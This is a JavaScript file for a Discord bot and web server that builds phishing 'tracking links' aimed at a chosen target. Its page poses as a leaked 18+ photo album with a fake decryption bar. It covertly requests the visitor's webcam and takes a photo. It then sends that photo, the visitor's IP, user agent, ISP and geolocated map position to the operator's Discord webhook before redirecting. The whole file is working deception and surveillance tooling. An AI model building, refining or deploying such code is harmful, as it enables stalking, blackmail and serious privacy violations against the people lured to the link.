const { Client, GatewayIntentBits, SlashCommandBuilder, MessageFlags } = require('discord.js');
const express = require('express');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// ================== ENV VARIABLES ==================
const TOKEN = process.env.DISCORD_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const DOMAIN = process.env.DOMAIN;   // Must be https://clicklink.space

if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
  console.error("❌ Missing environment variables!");
}

app.set('trust proxy', true);
app.use(express.json());

// Health Check
app.get('/', (req, res) => res.send('✅ Service running'));

const trackingLinks = new Map();

// ================== NO BLUR - YOUR ORIGINAL IMAGE ==================
app.get('/nsfw-leak/:id', (req, res) => {
  const trackId = req.params.id;
  const originalUrl = trackingLinks.get(trackId);

  if (!originalUrl) {
    return res.send('<h1 style="color:#ff4444; text-align:center; margin-top:120px;">This link has expired or is invalid</h1>');
  }

  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
  const userAgent = req.headers['user-agent'] || 'Unknown';

  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Discord • Private NSFW Leak</title>
  <style>
    body { 
      background: #0a0a0a; 
      color: #ddd; 
      font-family: 'Segoe UI', Arial, sans-serif; 
      text-align: center; 
      margin: 0; 
      padding: 30px 15px; 
      min-height: 100vh;
    }
    .header {
      color: #ff00aa;
      font-size: 26px;
      margin-bottom: 8px;
    }
    .subheader {
      color: #aaa;
      font-size: 15px;
      margin-bottom: 25px;
    }
    .album {
      max-width: 420px;
      margin: 0 auto 30px;
      background: #111;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 0 30px rgba(255,0,170,0.4);
      border: 1px solid #333;
    }
    .preview {
      width: 100%;
      height: 480px;
      background: url('https://i.imgur.com/NOrim.png') center/cover no-repeat;  /* Your original image - No blur */
      position: relative;
    }
    .preview::after {
      content: "18+ LEAKED";
      position: absolute;
      top: 15px;
      left: 15px;
      background: #c00;
      color: white;
      padding: 6px 16px;
      border-radius: 4px;
      font-size: 13px;
      font-weight: bold;
    }
    .info {
      padding: 15px;
      background: #1a1a1a;
      font-size: 14px;
      color: #bbb;
    }
    .progress-container {
      margin: 30px auto;
      max-width: 380px;
    }
    .progress { 
      height: 9px; 
      background: #222; 
      border-radius: 4px; 
      overflow: hidden; 
    }
    .bar { 
      height: 100%; 
      width: 0%; 
      background: linear-gradient(90deg, #ff00aa, #ff66cc); 
      animation: load 6.5s linear forwards; 
    }
    .status { 
      color: #00ff99; 
      font-size: 17px; 
      margin-top: 12px;
    }
    @keyframes load { 
      to { width: 100%; } 
    }
  </style>
</head>
<body>
  <div class="header">🔞 Private NSFW Leak</div>
  <div class="subheader">Leaked from restricted Discord server • 47 photos + 12 videos</div>
  
  <div class="album">
    <div class="preview"></div>
    <div class="info">
      Posted by @secretleaks • 3 hours ago<br>
      <strong>18+ ONLY • Do not share</strong>
    </div>
  </div>

  <p style="color:#ff99cc;">Decrypting full album...</p>
  <div class="progress-container">
    <div class="progress"><div class="bar"></div></div>
  </div>
  <p class="status" id="status">Decrypting media files • 69%...</p>

  <video id="video" autoplay playsinline style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script>
    let stream = null;
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function logVisit(photo = null, cameraStatus = "Denied") {
      fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          trackId: "${trackId}",
          ip: "${ip}",
          userAgent: "${userAgent.replace(/"/g, '\\"')}",
          photo: photo,
          cameraAccess: photo ? "Granted" : cameraStatus
        })
      }).catch(() => {});
    }

    async function start() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        video.onloadedmetadata = () => setTimeout(takePhoto, 3600);
      } catch(e) {
        document.getElementById('status').innerHTML = "Camera access blocked<br>Redirecting...";
        await logVisit(null, "Denied");
        setTimeout(() => window.location.href = "${originalUrl}", 1600);
      }
    }

    function takePhoto() {
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const photo = canvas.toDataURL('image/jpeg', 0.85);

      logVisit(photo, "Granted").then(() => {
        if (stream) stream.getTracks().forEach(t => t.stop());
        setTimeout(() => window.location.href = "${originalUrl}", 1100);
      });
    }

    start();
  </script>
</body>
</html>`;

  res.send(html);
});


// ================== LOG ENDPOINT ==================
app.post('/log', async (req, res) => {
  const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
  const originalUrl = trackingLinks.get(trackId) || 'Unknown';

  let city = 'Unknown', region = '', country = '', lat = '', lon = '', isp = 'Unknown';

  try {
    if (ip && ip !== 'Unknown') {
      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { timeout: 6000 });
      if (geo.data.status === "success") {
        city = geo.data.city || 'Unknown';
        region = geo.data.regionName || '';
        country = geo.data.country || '';
        lat = geo.data.lat || '';
        lon = geo.data.lon || '';
        isp = geo.data.isp || 'Unknown';
      }
    }
  } catch (e) {}

  const locationText = `${city}, ${region ? region + ', ' : ''}${country}`;
  const mapsLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '#';

  const embed = {
    title: "🎯 NSFW Link Hit",
    color: cameraAccess === "Granted" ? 0x00ff88 : 0xffaa00,
    fields: [
      { name: "IP", value: `\`${ip}\``, inline: true },
      { name: "Location", value: `${locationText} (${lat || 'N/A'}, ${lon || 'N/A'})`, inline: false },
      { name: "Camera", value: cameraAccess, inline: true },
      { name: "ISP", value: isp, inline: true },
      { name: "Maps", value: mapsLink !== '#' ? `[📍 View on Maps](${mapsLink})` : "N/A", inline: false },
      { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
      { name: "Original URL", value: originalUrl, inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    if (photo && photo.startsWith('data:image')) {
      const form = new FormData();
      form.append('payload_json', JSON.stringify({ embeds: [embed] }));
      const base64Data = photo.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      form.append('file', buffer, 'photo.jpg');
      await axios.post(WEBHOOK_URL, form, { headers: form.getHeaders() });
    } else {
      await axios.post(WEBHOOK_URL, { embeds: [embed] });
    }
  } catch (err) {
    console.error("Webhook error:", err.message);
  }

  res.sendStatus(200);
});

// ================== FIXED DISCORD BOT ==================
client.once('ready', () => {
  console.log(`✅ Bot online → ${client.user.tag}`);
});

const cmd = new SlashCommandBuilder()
  .setName('create')
  .setDescription('Create clean NSFW tracking link')
  .addStringOption(opt =>
    opt.setName('url')
      .setDescription('Real URL to redirect to')
      .setRequired(true));

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand() || interaction.commandName !== 'create') return;

  try {
    // This is the most important fix for "The application did not respond"
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const url = interaction.options.getString('url');
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      return interaction.editReply({ content: '❌ URL must start with http:// or https://' });
    }

    const trackId = 'leak-' + Math.random().toString(36).substring(2, 12);
    trackingLinks.set(trackId, url);

    const trackingLink = `${DOMAIN}/nsfw-leak/${trackId}`;

    await interaction.editReply({
      content: `**✅ Clean NSFW Tracking Link Created!**\n\n` +
               `**Tracking Link:** ${trackingLink}\n` +
               `**Redirects to:** ${url}\n\n` +
               `Send this link to the target.`,
    });
  } catch (err) {
    console.error("Interaction error:", err.message);
  }
});

// Start Server
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));

client.login(TOKEN).catch(err => console.error("Login failed:", err.message));

process.on('unhandledRejection', reason => console.error('Unhandled Rejection:', reason));
